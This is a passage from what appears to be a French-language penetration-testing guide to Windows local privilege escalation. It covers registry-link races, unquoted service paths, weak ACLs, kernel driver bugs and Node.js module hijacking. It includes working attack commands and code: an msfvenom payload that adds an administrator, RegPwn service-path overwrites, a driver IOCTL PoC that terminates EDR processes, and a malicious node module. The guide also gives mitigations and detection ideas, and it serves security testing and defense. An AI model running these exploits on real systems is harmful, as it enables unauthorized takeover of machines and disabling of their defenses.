1. Renseignez la valeur **HKCU ATConfig** que vous voulez faire écrire par SYSTEM.
2. Déclenchez la copie vers le bureau sécurisé (par exemple, **LockWorkstation**), ce qui lance le flux du broker AT.
3. **Remportez la course** en plaçant un **oplock** sur `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` ; lorsque l’oplock se déclenche, remplacez la clé **HKLM Session ATConfig** par un **lien de registre** pointant vers une cible HKLM protégée.
4. SYSTEM écrit la valeur choisie par l’attaquant dans le chemin HKLM redirigé.

Une fois l’écriture de valeur HKLM arbitraire obtenue, passez à l’élévation de privilèges locale (LPE) en écrasant les valeurs de configuration d’un service :

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/ligne de commande)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Choisissez un service qu’un utilisateur standard peut démarrer (par exemple, **`msiserver`**) et déclenchez-le après l’écriture. **Remarque :** l’implémentation publique de l’exploit **verrouille la station de travail** dans le cadre de la course.

Outils d’exemple (RegPwn BOF / autonome) :<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Permissions AppendData/AddSubdirectory sur le registre des services

Si vous disposez de cette permission sur une clé de registre, cela signifie que **vous pouvez créer des sous-clés à partir de celle-ci**. Dans le cas des services Windows, cela **suffit pour exécuter du code arbitraire** :

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Si le chemin d’accès à un exécutable n’est pas entre guillemets, Windows essaiera d’exécuter chaque chemin possible se terminant avant un espace.

Par exemple, pour le chemin _C:\Program Files\Some Folder\Service.exe_, Windows essaiera d’exécuter :

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Lister tous les chemins de service non entourés de guillemets, à l’exclusion de ceux associés aux services Windows intégrés :

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Vous pouvez détecter et exploiter** cette vulnérabilité avec metasploit : `exploit/windows/local/trusted\_service\_path` Vous pouvez créer manuellement un binaire de service avec metasploit :

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Actions de récupération

Windows permet aux utilisateurs de spécifier les actions à effectuer en cas de défaillance d’un service. Cette fonctionnalité peut être configurée pour pointer vers un binaire. Si ce binaire peut être remplacé, une élévation de privilèges peut être possible. Vous trouverez plus de détails dans la [documentation officielle](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Cibles de scripts des tâches planifiées

Pour une tâche activée qui exécute `cmd.exe /c` avec un fichier `.bat` ou `.cmd`, vérifiez le script indiqué dans les **arguments de l’action** ainsi que `cmd.exe`. Il en va de même pour l’argument fichier explicite d’un interpréteur, comme `-File` dans PowerShell. Si un fichier batch planifié contient un appel littéral à PowerShell avec `-File`, vérifiez également les ACL du script référencé ; les variables, les conditions et l’enchaînement de commandes nécessitent un traçage manuel. Un script ou un répertoire parent accessible en écriture par l’appelant ne constitue une piste d’exécution entre comptes que si le principal configuré pour la tâche diffère de l’appelant et que la tâche atteint effectivement cette action. Une ACL autorisant uniquement l’ajout peut être pertinente pour les scripts, mais un `exit` antérieur ou un autre flux de contrôle peut rendre les lignes ajoutées inaccessibles. Vérifiez les ACL effectives, le [contexte d’exécution de la tâche](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), le répertoire de travail, le déclencheur et la stratégie de contrôle des applications avant de conclure à une élévation de privilèges. L’inventaire ne doit ni modifier le script ni démarrer la tâche.

## Flux nommés sur les fichiers accessibles

Sur NTFS, un fichier lisible peut comporter un flux nommé `:$DATA` dont le contenu n’apparaît pas dans un listage de répertoire ordinaire. Pour un petit ensemble pertinent de fichiers de sauvegarde ou de configuration accessibles, examinez les **noms et tailles** des flux avant d’ouvrir leur contenu ; Windows les expose via [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), ainsi que par la commande PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Un nom de flux évoquant un secret n’est qu’une piste. Vérifiez les droits de lecture effectifs sur le fichier, la prise en charge des flux par le système de fichiers, la présence d’identifiants exploitables dans le flux et le compte auquel ils permettent réellement de s’authentifier. Évitez les analyses récursives des flux et l’affichage de leur contenu lors d’un inventaire courant.

## Entrées auxiliaires du Windows Driver Kit planifiées

Le Windows Driver Kit facultatif comprend `StandaloneRunner.exe`, qui peut utiliser `command.txt`, `reboot.rsf` et un fichier de projet `working\rsf.rsf` depuis son répertoire d’exécution. Une tâche planifiée ou un service qui lance cet utilitaire avec un compte privilégié peut transformer un accès en écriture de faible privilège à ces entrées en exécution de commandes dans le contexte de ce compte, même si l’exécutable de l’utilitaire est protégé. Vérifiez que le consommateur est bien privilégié et que **les deux** fichiers auxiliaires peuvent être créés ou modifiés ; la simple présence de l’utilitaire ne suffit pas.

Pour une tâche planifiée, examinez son [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) dans l’action ainsi que les ACL des deux chemins des fichiers auxiliaires. Si la tâche ne spécifie pas de répertoire de travail, le répertoire de l’exécutable n’est qu’une piste à vérifier, et non une preuve de l’emplacement où la tâche lit ses entrées. Le prérequis du fichier de travail du projet doit également être satisfait. Vérifiez le principal réel de la tâche au lieu de supposer qu’elle s’exécute en tant que SYSTEM.

## Applications

### Applications installées

Vérifiez les **permissions des binaires** (vous pourrez peut-être en remplacer un et élever vos privilèges) et celles des **dossiers** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Chemin de réparation de l’agent Windows Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) concerne les anciennes versions des agents Windows Checkmk, qui écrivaient des fichiers de commandes dans `C:\Windows\Temp`, puis exécutaient un fichier préexistant protégé en écriture lorsque son remplacement échouait. Le fournisseur a corrigé le problème dans les versions 2.1.0p40, 2.2.0p23, 2.3.0b1 et 2.4.0b1. Vérifiez le niveau de correctif complet installé et si l’opération concernée de l’agent peut être exécutée ; une indication de branche comme `2.1` ne permet pas d’établir l’exposition. L’énumération peut examiner la version, l’état du service et les permissions du dossier Temp sans créer de fichiers ni déclencher de commandes de l’agent.

#### Examen du service SAML d’ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) concernait la build 6210 et les versions antérieures d’ADSelfService Plus ; le fournisseur a corrigé le problème dans la build 6211. La faille est pertinente uniquement si le SSO SAML **est ou a été** activé. Une entrée de produit installé ou un chemin de service constitue donc une piste, et non un verdict de vulnérabilité : confirmez la build exacte, l’historique de configuration SAML, l’accessibilité réseau du service et le compte sous lequel il s’exécute. L’exécution de code via le service hérite des privilèges de ce compte ; une exécution sous SYSTEM nécessite une instance exécutée sous SYSTEM. Un fichier `OfflineBackup_*.ezip` lisible dans le répertoire Backup du produit constitue une piste distincte de sauvegarde chiffrée, et non la preuve qu’un identifiant est exploitable ou que cette faille SAML est présente. Lors de l’énumération courante, consignez son chemin et ses droits d’accès sans le décompresser.

#### Contrôleur Jenkins et limites des comptes de domaine

Sur un contrôleur Jenkins Windows, distinguez le droit de créer ou configurer un job du droit de le démarrer : [Jenkins les documente comme des droits distincts, `Job/Create`, `Job/Configure` et `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Une planification configurée ou un déclencheur distant peut offrir une autre façon de lancer une build, mais vérifiez que cette option est activée et que la build s’exécute réellement. L’exécution utilise l’identité du contrôleur ou de l’agent sélectionné, et un identifiant enregistré n’est utilisable que si le job peut accéder à son périmètre. Examinez séparément l’accès aux métadonnées de `JENKINS_HOME` : Jenkins conserve les éléments d’identification et les clés de chiffrement dans `credentials.xml`, `secrets/hudson.util.Secret` et `secrets/master.key` ([stockage des secrets Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Leur seule présence ne révèle pas de mot de passe ; vérifiez **l’accès en lecture aux fichiers requis** et l’existence d’une voie distincte de réutilisation du compte, sans afficher de secrets dans une sortie partagée. Si ce compte dispose d’un droit d’écriture sur l’attribut `scriptPath` d’un objet utilisateur AD, confirmez qu’un chemin de script est modifiable et qu’un processus réel de connexion ou de planification s’exécute sous l’identité de l’utilisateur cible avant de considérer cela comme une exécution entre utilisateurs. Toute prise de contrôle supplémentaire d’un groupe nécessite une vérification distincte des droits AD effectifs.

#### Identité de l’agent Azure Pipelines auto-hébergé

Pour un projet Azure DevOps Server ou Azure Pipelines, distinguez l’autorisation de **créer ou modifier** un pipeline de celle de le **mettre en file d’attente** et d’utiliser le pool d’agents sélectionné ; [Microsoft documente séparément les autorisations de pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) et [l’autorisation des pools](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Si un compte moins privilégié peut soumettre une étape de script et exécuter ce pipeline sur un agent Windows auto-hébergé, l’étape s’exécute sous l’identité du [compte système d’exploitation configuré pour l’agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Vérifiez le pipeline exact, les restrictions de branches et de ressources, le pool autorisé, le job exécutable et l’identité du service de l’agent avant de conclure à une transition entre utilisateurs ou vers SYSTEM. La simple présence d’un agent, d’un rôle de projet ou d’un accès en écriture au dépôt ne constitue qu’une piste ; examinez les permissions et les métadonnées locales du service sans lancer de build lors d’une énumération passive.

#### Identifiants Microsoft Entra Connect Sync

[Microsoft distingue](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) le **compte de service ADSync**, qui exécute le service de synchronisation et accède à sa base de données SQL, du **compte de connecteur AD DS**, dont les permissions d’annuaire dépendent des fonctionnalités de synchronisation configurées. Les identifiants du connecteur sont stockés chiffrés dans cette base de données, avec des clés [protégées par DPAPI sous le compte de service ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). La présence d’un service de synchronisation installé, d’un groupe local dont le nom évoque des droits d’administrateur ou d’un accès à la base de données ne suffit pas à établir qu’un identifiant peut être déchiffré ou qu’une élévation de privilèges sur le domaine est possible. Examinez séparément les droits réels de lecture de la base de données, l’accès aux clés et au compte de service, l’installation et la configuration SQL, l’identité du connecteur configuré et les privilèges AD effectifs de cette identité. Lors de l’énumération courante, affichez uniquement les métadonnées du service et des accès, sans interroger ni afficher les secrets stockés.

#### Permissions des DLL de support des pilotes d’imprimante

Un pilote d’imprimante installé peut conserver des DLL de support dans `C:\ProgramData` et les charger dans un processus d’impression plus privilégié. Examinez les ACL du répertoire exact du pilote et des DLL, y compris celles des répertoires parents et les points de réanalyse, même si l’énumération WMI des imprimantes est refusée. Pour le [problème de pilote d’imprimante Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), le chemin signalé était `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` ; [la divulgation originale](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) décrit le chargement de DLL par `PrintIsolationHost.exe`. Une ACL autorisant l’écriture n’est qu’une piste : vérifiez les droits d’écriture effectifs après prise en compte des entrées de refus, que le pilote concerné est installé et charge le fichier sous une identité privilégiée, et si le pilote mis à jour ou le programme de sécurité du fournisseur a corrigé l’installation. Ne déduisez pas la présence d’une vulnérabilité du seul nom du répertoire ou de la version du pilote.

### Permissions d’écriture

Vérifiez si vous pouvez modifier un fichier de configuration pour lire un fichier spécial ou si vous pouvez modifier un binaire qui sera exécuté par un compte Administrateur (schedtasks).

Pour trouver les permissions faibles sur les dossiers et fichiers du système, procédez comme suit :

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistance/exécution par chargement automatique de plugins Notepad++

Notepad++ charge automatiquement toute DLL de plugin située dans ses sous-dossiers `plugins`. Si une installation portable ou une copie modifiable est présente, déposer un plugin malveillant permet une exécution automatique de code dans `notepad++.exe` à chaque lancement (y compris depuis `DllMain` et les callbacks du plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Exécution au démarrage

**Vérifiez si vous pouvez remplacer une entrée du registre ou un binaire qui sera exécuté par un autre utilisateur.**\
**Lisez** la **page suivante** pour en savoir plus sur les **emplacements d’autoruns intéressants pour élever les privilèges** :


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Pilotes

Recherchez d’éventuels pilotes **tiers suspects ou vulnérables**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Si un driver expose une primitive de lecture/écriture arbitraire du kernel (cas fréquent dans les gestionnaires IOCTL mal conçus), vous pouvez élever vos privilèges en volant directement un token SYSTEM dans la mémoire du kernel.<sup>[[13]](#references)</sup> Consultez la technique détaillée étape par étape ici :

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Ressources associées sur l’exploitation du kernel Windows :

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Pour les bugs de race condition où l’appel vulnérable ouvre un chemin Object Manager contrôlé par l’attaquant, ralentir délibérément la recherche (en utilisant des composants de longueur maximale ou des chaînes de répertoires profondes) peut étendre la fenêtre de quelques microsecondes à plusieurs dizaines de microsecondes :

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF dans les files d’attente cancel-safe, divulgations de paged-pool et pivots via I/O ring

Certaines chaînes LPE du kernel Windows peuvent être construites à partir de deux bugs individuellement peu puissants : une **race condition sur le cycle de vie d’une file d’attente cancel-safe** qui libère une requête/CBD alors que le verrou de la file est toujours détenu, et une divulgation **lock-release-before-copy** qui révèle une allocation paged-pool libérée pendant `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Notes d’audit et d’exploitation :

- **Free-under-lock + cancel afterwards** : recherchez un chemin de réussite qui effectue **Acquire -> CompleteRequest/free -> Release**, tandis que le chemin d’annulation effectue **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Si le chemin de réussite atteint `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` avant de libérer le verrou CBDQ/CSQ, un thread bloqué dans `NtCancelIoFileEx -> IopCsqCancelRoutine` peut reprendre plus tard et transmettre un `PFLT_CALLBACK_DATA` libéré au callback de suppression du driver.
- **Réutilisez l’objet de file libéré** avec une allocation paged-pool contrôlée par l’attaquant et de même taille. Les Data Queue Entries de `NPFS` sont utiles, car leur contenu et leur taille sont contrôlables et vous pouvez ensuite les sonder au moyen d’opérations de lecture/peek sur le pipe. Si l’objet libéré contient des liens de liste, remplacez-les par une **liste cyclique de faux nœuds de requête en mémoire utilisateur** afin que le driver traite de manière répétée des structures de requête définies par l’attaquant au lieu de s’arrêter à la tête de liste d’origine.
- **Améliorez une écriture prévisible** : si la fausse requête redirige un pointeur de contexte imbriqué utilisé par des écritures de bookkeeping (horodatages / QPC / champs adjacents au refcount), vous pouvez obtenir une écriture kernel **dont l’adresse est contrôlée, mais pas la valeur**. Dans ce cas, ciblez le champ **length/size** d’un objet pool pulvérisé plutôt qu’un pointeur final vers du code/des données, puis parcourez le spray jusqu’à ce que l’objet corrompu permette une **lecture paged-pool hors limites**.
- **Schéma de divulgation exploitable par race condition** : tout appel système qui effectue `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` est un excellent candidat. La fiabilité augmente si l’attaquant peut agrandir le buffer copié (par exemple en ajoutant de nombreuses entrées de liste/ressource qui augmentent la taille finale de l’allocation du sérialiseur), car la copie plus longue élargit la fenêtre de remplacement sans nécessairement faire planter la machine.
- **Cibles de réapprovisionnement riches en pointeurs** : les tableaux de buffers enregistrés de Windows **I/O ring** sont d’excellentes cibles de divulgation, car leur taille paged-pool est contrôlée par l’attaquant (`8 * regBufferCnt`) et chaque élément est un pointeur kernel vers un `_IOP_MC_BUFFER_ENTRY`. Révélez l’un de ces tableaux, récupérez l’`IORING_OBJECT` qui l’entoure, puis corrompez **`RegBuffers`** et **`RegBuffersCount`** afin que les opérations I/O ring suivantes utilisent des entrées forgées par l’attaquant et fournissent une lecture/écriture kernel arbitraire. Si la seule écriture disponible ne vous donne qu’un octet stable (par exemple depuis `KUSER_SHARED_DATA+0x14`), utilisez des **écritures non alignées qui se chevauchent** pour construire un pointeur utilisateur composé d’octets répétés, tel que `0x0101010101010101`, mappez-le avec `VirtualAlloc`, puis placez-y le tableau de buffers enregistrés forgé.<sup>[[30]](#references)</sup>

Indicateurs utiles pour le débogage :

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Une fois que vous obtenez des primitives de lecture/écriture arbitraires dans le kernel à partir du I/O ring corrompu, volez un token SYSTEM en suivant le workflow post-primitive standard :

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives de corruption mémoire des ruches du registre

Les vulnérabilités modernes des ruches permettent de préparer des dispositions déterministes, d'exploiter des descendants de HKLM/HKU accessibles en écriture et de convertir la corruption de métadonnées en débordements du paged pool du kernel sans pilote personnalisé. Découvrez la chaîne complète ici :

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusion de type en mode direct de `RtlQueryRegistryValues` à partir de chemins contrôlés par l'attaquant

Certains pilotes acceptent un chemin de registre provenant du userland, vérifient uniquement qu'il s'agit d'une chaîne UTF-16 valide, puis appellent `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` avec `RTL_QUERY_REGISTRY_DIRECT` vers un scalaire sur la pile, tel que `int readValue`. Si `RTL_QUERY_REGISTRY_TYPECHECK` est absent, `EntryContext` est interprété selon le type réel du registre, et non selon le type attendu par le développeur.

Cela crée deux primitives utiles :<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle** : un chemin absolu `\Registry\...` contrôlé par l'utilisateur permet au pilote d'interroger des clés choisies par l'attaquant, de révéler leur existence via les codes de retour ou les journaux, et parfois de lire des valeurs auxquelles l'appelant ne pourrait pas accéder directement.
- **Kernel memory corruption** : une destination scalaire telle que `&readValue` est soumise à une confusion de type en tant que `REG_QWORD`, `UNICODE_STRING` ou tampon binaire de taille variable, selon le type de la valeur du registre.

Notes pratiques sur l'exploitation :

- **Atténuation dans Windows 8 et les versions ultérieures** : si la requête cible une **ruche non fiable** avec `RTL_QUERY_REGISTRY_DIRECT`, mais sans `RTL_QUERY_REGISTRY_TYPECHECK`, les appelants du kernel provoquent un crash `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Pour préserver l'exploitabilité, recherchez plutôt des **clés contrôlables par l'attaquant dans des ruches système fiables**, au lieu de préparer des valeurs sous `HKCU`.
- **Préparation dans une ruche fiable** : utilisez NtObjectManager pour énumérer les descendants accessibles en écriture de `\Registry\Machine`, puis relancez l'analyse avec un token **à faible intégrité** dupliqué pour trouver les clés accessibles depuis des contextes sandboxés :<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`** : une écriture directe de 8 octets dans un `int` de 4 octets corrompt les données adjacentes sur la pile et peut écraser partiellement un pointeur de callback/fonction proche.
- **`REG_SZ` / `REG_EXPAND_SZ`** : le mode direct s’attend à ce qu’`EntryContext` pointe vers une `UNICODE_STRING`. Si le code charge d’abord un `REG_DWORD` contrôlé par l’attaquant dans un scalaire sur la pile, puis réutilise le même tampon pour lire une chaîne, l’attaquant contrôle `Length`/`MaximumLength` et influence partiellement le pointeur `Buffer`, ce qui produit une écriture kernel semi-contrôlée.
- **`REG_BINARY`** : pour les données binaires volumineuses, le mode direct traite le premier `LONG` à l’adresse `EntryContext` comme une taille de tampon signée. Si une lecture précédente de `REG_DWORD` laisse une valeur contrôlée par l’attaquant **négative** dans le scalaire réutilisé, la requête `REG_BINARY` suivante copie les octets de l’attaquant directement dans les emplacements adjacents sur la pile ; c’est souvent la voie la plus simple pour écraser complètement un pointeur de callback.

Motif de recherche particulièrement prometteur : **des lectures de registre hétérogènes dans la même variable sur la pile sans la réinitialiser**. Recherchez `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, les pointeurs `EntryContext` réutilisés et les chemins de code où la première lecture du registre détermine si une seconde lecture a lieu.

#### Exploitation de l’absence de FILE_DEVICE_SECURE_OPEN sur les objets périphériques (LPE + neutralisation de l’EDR)

Certains pilotes tiers signés créent leur objet périphérique avec un SDDL strict via IoCreateDeviceSecure, mais oublient de définir FILE_DEVICE_SECURE_OPEN dans DeviceCharacteristics. Sans cet indicateur, la DACL sécurisée n’est pas appliquée lorsque le périphérique est ouvert via un chemin contenant un composant supplémentaire. Tout utilisateur non privilégié peut alors obtenir un handle en utilisant un chemin d’espace de noms tel que :<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (cas observé dans le monde réel)

Dès qu’un utilisateur peut ouvrir le périphérique, il peut exploiter les IOCTL privilégiés exposés par le pilote pour obtenir une LPE et effectuer des altérations. Exemples de capacités observées dans la nature :
- Renvoyer des handles avec un accès complet à des processus arbitraires (vol de token / shell SYSTEM via DuplicateTokenEx/CreateProcessAsUser).
- Lecture/écriture brute de disque sans restriction (altération hors ligne, techniques de persistance au démarrage).
- Terminer des processus arbitraires, y compris des processus Protected Process/Light (PP/PPL), ce qui permet de neutraliser un AV/EDR depuis l’espace utilisateur via le kernel.

Modèle de PoC minimal (mode utilisateur) :
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations pour les développeurs
- Définissez toujours FILE_DEVICE_SECURE_OPEN lors de la création d’objets de périphérique destinés à être restreints par une DACL.
- Validez le contexte de l’appelant pour les opérations privilégiées. Ajoutez des vérifications PP/PPL avant d’autoriser la terminaison d’un processus ou le renvoi d’un handle.
- Restreignez les IOCTL (masques d’accès, METHOD_*, validation des entrées) et envisagez des modèles avec broker plutôt que des privilèges directs dans le kernel.

Idées de détection pour les défenseurs
- Surveillez les ouvertures en mode utilisateur de noms de périphériques suspects (par ex. \\ .\\amsdk*) et les séquences d’IOCTL spécifiques indiquant un abus.
- Appliquez la liste de blocage des pilotes vulnérables de Microsoft (HVCI/WDAC/Smart App Control) et maintenez vos propres listes d’autorisation et de blocage.


## PATH DLL Hijacking

Si vous disposez de **permissions d’écriture dans un dossier présent dans PATH**, vous pourriez détourner une DLL chargée par un processus et **escalader vos privilèges**.<sup>[[2]](#references)</sup>

Vérifiez les permissions de tous les dossiers présents dans PATH :

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Pour plus d’informations sur la manière d’abuser de cette vérification :


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Détournement de la résolution des modules Node.js / Electron via `C:\node_modules`

Il s’agit d’une variante de **Windows uncontrolled search path** qui affecte les applications **Node.js** et **Electron** lorsqu’elles effectuent un import nu tel que `require("foo")` et que le module attendu est **manquant**.<sup>[[20]](#references)</sup>

Node résout les packages en remontant l’arborescence des répertoires et en vérifiant les dossiers `node_modules` de chaque répertoire parent. Sous Windows, cette remontée peut atteindre la racine du lecteur. Une application lancée depuis `C:\Users\Administrator\project\app.js` peut donc finir par rechercher les chemins suivants :<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Si un **utilisateur à faibles privilèges** peut créer `C:\node_modules`, il peut y déposer un fichier malveillant `foo.js` (ou un dossier de package) et attendre qu’un **processus Node/Electron exécuté avec des privilèges supérieurs** résolve la dépendance manquante. Le payload s’exécute dans le contexte de sécurité du processus victime : cela constitue donc une **LPE** lorsque la cible s’exécute en tant qu’administrateur, depuis une tâche planifiée élevée/un wrapper de service, ou depuis une application de bureau privilégiée lancée automatiquement.

Ce cas est particulièrement fréquent lorsque :

- une dépendance est déclarée dans `optionalDependencies`<sup>[[22]](#references)</sup>
- une bibliothèque tierce encapsule `require("foo")` dans un `try/catch` et poursuit l’exécution en cas d’échec
- un package a été retiré des builds de production, omis lors du packaging ou n’a pas pu être installé
- le `require()` vulnérable se trouve profondément dans l’arborescence des dépendances plutôt que dans le code principal de l’application

### Recherche de cibles vulnérables

Utilisez **Procmon** pour vérifier le chemin de résolution :<sup>[[23]](#references)</sup>

- Filtrez par `Process Name` = exécutable cible (`node.exe`, l’EXE de l’application Electron ou le processus wrapper)
- Filtrez par `Path` `contains` `node_modules`
- Concentrez-vous sur `NAME NOT FOUND` et sur la dernière ouverture réussie sous `C:\node_modules`

Modèles de code utiles à repérer lors de l’examen de fichiers `.asar` décompressés ou des sources de l’application :

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifiez le **nom du package manquant** à partir de Procmon ou de l’examen du code source.
2. Créez le répertoire de recherche à la racine s’il n’existe pas déjà :

```powershell
mkdir C:\node_modules
```

3. Déposez un module portant exactement le nom attendu :

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Déclenchez l’application victime. Si l’application tente `require("foo")` et que le module légitime est absent, Node peut charger `C:\node_modules\foo.js`.

Parmi les exemples réels de modules facultatifs manquants correspondant à ce schéma figurent `bluebird` et `utf-8-validate`, mais la **technique** est réutilisable : trouvez n’importe quel **import nu manquant** qu’un processus Node/Electron Windows privilégié résoudra.

### Détection et mesures de sécurisation

- Déclenchez une alerte lorsqu’un utilisateur crée `C:\node_modules` ou y écrit de nouveaux fichiers/packages `.js`.
- Recherchez les processus à intégrité élevée qui lisent depuis `C:\node_modules\*`.
- Incluez toutes les dépendances d’exécution dans les packages de production et auditez l’utilisation de `optionalDependencies`.
- Examinez le code tiers à la recherche de motifs silencieux du type `try { require("...") } catch {}`.
